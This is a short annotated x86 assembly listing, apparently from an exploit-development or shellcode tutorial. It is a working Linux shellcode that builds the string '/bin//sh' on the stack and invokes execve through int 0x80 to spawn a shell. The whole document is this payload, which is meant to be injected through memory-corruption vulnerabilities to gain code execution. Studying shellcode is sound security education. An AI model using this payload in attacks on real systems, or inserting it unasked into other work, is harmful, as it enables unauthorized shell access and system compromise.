xor	%eax, %eax	#Clearing eax register
push	%eax		#Pushing NULL bytes
push	$0x68732f2f	#Pushing //sh
push	$0x6e69622f	#Pushing /bin
movl	%esp, %ebx	#ebx now has address of /bin//sh
push	%eax		#Pushing NULL byte
movl	%esp, %edx	#edx now has address of NULL byte
push	%ebx		#Pushing address of /bin//sh
movl	%esp, %ecx	#ecx now has address of address
			#of /bin//sh byte
movb	$11, %al	#syscall number of execve is 11
int	$0x80		#Make the system call
